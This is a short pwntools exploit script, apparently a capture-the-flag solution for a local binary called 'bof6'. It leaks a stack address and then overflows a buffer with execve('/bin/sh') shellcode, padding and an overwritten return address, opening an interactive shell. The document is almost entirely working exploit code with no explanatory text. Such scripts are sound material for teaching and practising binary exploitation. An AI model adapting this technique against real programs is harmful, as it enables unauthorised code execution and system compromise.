#!/bin/python3
from pwn import *
exe = ELF('./bof6',checksec=False)
p = process(exe.path)
shellcode = asm('''
  mov rax,0x3b 
    mov rdi, 29400045130965551
    push rdi 
    mov rdi, rsp 
    xor rsi, rsi 
    xor rdx,rdx
       syscall  
''',arch='amd64')
#pop_rbp = 0x000000000040119d
## leak stack address 
input()
payl = b''
payl += b'a'* 0x50
p.sendlineafter(b'>',b'1')
p.sendafter(b'>',payl)
p.recvuntil(b'a'*0x50)
stack_leak = u64(p.recv(6)+b'\x00\x00')
shell_leak = stack_leak - 544
rbp_leak = stack_leak - 32
log.info("shell_leak:  "+hex(shell_leak))
log.info("stack_leak:   "+hex(stack_leak))
payload = shellcode
payload += 483*b'\x00'
payload += p64(shell_leak)
payload += p64(shell_leak)

p.sendlineafter(b'>',b'2')
p.sendafter(b'>',payload)                                #breakpoint 1 : 0x00401237
                                                         #breakpoint 2 : 0x004012bb

p.interactive()
